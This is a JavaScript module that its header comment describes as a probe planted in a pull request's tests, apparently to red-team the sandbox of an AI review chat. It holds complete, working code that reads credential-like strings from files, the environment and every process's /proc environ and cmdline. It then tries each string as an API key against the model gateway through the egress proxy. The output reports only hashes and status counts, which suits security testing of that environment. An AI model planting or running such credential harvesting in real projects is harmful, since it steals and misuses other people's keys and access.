import { createHash } from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import path from "node:path";

/**
 * What the pull request plants in its tests: it collects everything its
 * code can read that looks like a credential (the environment, every
 * process's environment and arguments, files under the usual roots) and
 * tries each as a key for the review chat's model through Work's gateway.
 * It prints one line, `WORK-PROBE <json>`, naming candidates by hash only.
 */
const ROOTS = ["/workspace", "/tmp", "/root", "/home", "/run", "/var/run"];
const SKIP = new Set(["node_modules", "objects", "proc", "sys", "dev"]);
const CREDENTIAL_PATH =
  /grant|token|secret|key|cred|auth|session|config|netrc/i;
const TOKEN = /[A-Za-z0-9_\-.~+/=]{20,}/g;
const GATEWAY = /https?:\/\/[^\s"'<>@]+?\/api\/gateway/g;
const MAX_ATTEMPTS = 300;

function walk(directory, depth, found) {
  let entries = [];
  try {
    entries = fs.readdirSync(directory, { withFileTypes: true });
  } catch {
    return;
  }
  for (const entry of entries) {
    const file = path.join(directory, entry.name);
    if (entry.isSocket()) found.sockets.push(file);
    else if (entry.isDirectory()) {
      if (depth < 8 && !SKIP.has(entry.name)) walk(file, depth + 1, found);
    } else if (entry.isFile()) {
      try {
        if (fs.statSync(file).size <= 256 * 1024) {
          found.texts.set(file, fs.readFileSync(file, "utf8"));
          found.files += 1;
        }
      } catch {
        found.unreadable += 1;
      }
    }
  }
}

function processes(found) {
  let pids = [];
  try {
    pids = fs.readdirSync("/proc").filter((entry) => /^\d+$/.test(entry));
  } catch {
    return;
  }
  for (const pid of pids)
    for (const part of ["environ", "cmdline"])
      try {
        const text = fs.readFileSync(`/proc/${pid}/${part}`, "utf8");
        found.texts.set(`/proc/${pid}/${part}`, text.replaceAll("\0", "\n"));
      } catch {
        found.unreadable += 1;
      }
}

/** One POST through the sandbox's egress proxy; its status, or 0. */
function attempt(proxy, target, key) {
  const body = JSON.stringify({
    model: "claude-sonnet-5-5",
    max_tokens: 1,
    metadata: { user_id: "work-probe" },
    messages: [{ role: "user", content: "work-probe" }],
  });
  return new Promise((resolve) => {
    const request = http.request(
      {
        host: proxy.hostname,
        port: Number(proxy.port),
        method: "POST",
        path: target.toString(),
        timeout: 10_000,
        headers: {
          host: target.host,
          "content-type": "application/json",
          "content-length": Buffer.byteLength(body),
          "anthropic-version": "2023-06-01",
          "x-api-key": key,
          authorization: `Bearer ${key}`,
        },
      },
      (response) => {
        response.resume();
        resolve(response.statusCode ?? 0);
      },
    );
    request.on("timeout", () => request.destroy());
    request.on("error", () => resolve(0));
    request.end(body);
  });
}

export async function probe() {
  const found = { texts: new Map(), sockets: [], files: 0, unreadable: 0 };
  for (const root of ROOTS) walk(root, 0, found);
  processes(found);
  found.texts.set("env", Object.values(process.env).join("\n"));
  const gateways = new Set();
  const candidates = new Set();
  for (const [source, text] of found.texts) {
    for (const match of text.matchAll(GATEWAY)) gateways.add(match[0]);
    const credentialLike =
      source === "env" ||
      source.startsWith("/proc/") ||
      CREDENTIAL_PATH.test(source);
    if (credentialLike) {
      for (const match of text.matchAll(TOKEN)) candidates.add(match[0]);
      for (const line of text.split("\n"))
        if (/^\S{20,}$/.test(line.trim())) candidates.add(line.trim());
    }
  }
  const proxy = new URL(
    process.env.HTTP_PROXY ?? process.env.http_proxy ?? "http://127.0.0.1:3128",
  );
  const statuses = {};
  let attempts = 0;
  for (const gateway of gateways)
    for (const key of candidates) {
      if (attempts >= MAX_ATTEMPTS) break;
      attempts += 1;
      const target = new URL(`${gateway}/model/anthropic/v1/messages`);
      const status = await attempt(proxy, target, key);
      statuses[status] = (statuses[status] ?? 0) + 1;
    }
  const hash = (value) =>
    createHash("sha256").update(value).digest("hex").slice(0, 16);
  console.log(
    `WORK-PROBE ${JSON.stringify({
      files: found.files,
      unreadable: found.unreadable,
      sockets: found.sockets,
      gateways: [...gateways],
      candidates: [...candidates].map(hash),
      attempts,
      statuses,
    })}`,
  );
}
